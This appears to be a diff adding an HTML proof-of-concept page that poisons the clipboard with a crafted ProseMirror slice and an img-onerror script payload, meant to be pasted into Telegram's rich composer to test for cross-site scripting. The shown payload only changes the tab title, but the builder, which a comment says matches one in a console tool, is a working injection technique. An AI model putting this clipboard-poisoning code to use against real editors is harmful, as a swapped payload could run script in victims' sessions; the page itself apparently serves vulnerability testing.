@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8"><title>PASTE TEST T-20</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body{font-family:system-serif;background:#151e29;color:#dce7f2;margin:0;padding:24px}
+button{font-size:18px;padding:16px 24px;border-radius:10px;border:0;background:#2f6f9f;color:#fff}
+.ok{color:#7fe3a0;font-size:20px;margin-top:12px}</style></head><body>
+<h2>PASTE TEST · carril pm-slice de la consola</h2>
+<p>Tocá copiar, andá a Telegram (composer rich), pegá. Si ejecuta, el título de la pestaña cambia a <b>T20-FIRED</b>.</p>
+<button id="go">COPIAR TEST</button>
+<div class="ok" id="ok" hidden="true">✓ copiado</div>
+<script>
+'use strict';
+// builder IDENTICO al de la consola v13.3
+function buildPoisonClipboard(P) {
+  const ATTRS = {title:'Test', bordered:true, striped:false, titleRichHTML: P};
+  const SLICE = '0 0 ' + JSON.stringify(['table', ATTRS]);
+  const div = document.createElement('div');
+  div.style.position='fixed'; div.style.left='-9999px'; div.style.top='0';
+  div.innerHTML = '<table data-bordered="true"><tbody><tr><th>Test</th><th>OK</th></tr><tr><td>A</td><td>B</td></tr></tbody></table>';
+  div.setAttribute('data-pm-slice', SLICE);
+  document.body.appendChild(div);
+  const r = document.createRange(); r.selectNodeContents(div);
+  const s = getSelection(); s.removeAllRanges(); s.addRange(r);
+  const html = new XMLSerializer().serializeToString(div);
+  const listener = (e) => {
+    e.clipboardData.setData('text/html', html);
+    e.clipboardData.setData('text/plain', 'test');
+    e.preventDefault();
+  };
+  document.addEventListener('copy', listener);
+  document.execCommand('copy');
+  document.removeEventListener('copy', listener);
+  s.removeAllRanges(); div.remove();
+  return true;
+}
+document.getElementById('go').addEventListener('click', function(){
+  // payload inocuo: solo marca el titulo (sin reload, sin storage)
+  const P = '<img src=x onerror="document.title=\'T20-FIRED\'">';
+  buildPoisonClipboard(P);
+  const ok = document.getElementById('ok');
+  ok.hidden = false; ok.textContent = '✓ copiado — pegalo en Telegram';
+});
+</script></body></html>
